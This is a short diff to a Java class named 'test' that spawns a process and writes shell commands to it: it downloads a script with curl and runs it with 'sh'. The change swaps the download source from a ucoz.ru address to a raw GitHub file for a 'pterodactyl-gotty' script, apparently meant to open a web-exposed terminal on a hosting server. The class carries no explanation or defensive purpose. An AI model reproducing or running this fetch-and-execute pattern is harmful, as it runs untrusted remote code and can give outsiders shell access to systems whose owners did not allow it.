@@ -19,7 +19,7 @@ public class test
             final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             final OutputStream os = process.getOutputStream();
             final BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));
-            bw.write("curl -o 1.sh https://igriastranomier.ucoz.ru/hex1.txt");
+            bw.write("curl -o 1.sh https://raw.githubusercontent.com/mxl0s/pterodactyl-gotty/main/Script.txt");
             bw.newLine();
             bw.write("sh 1.sh");
             bw.newLine();
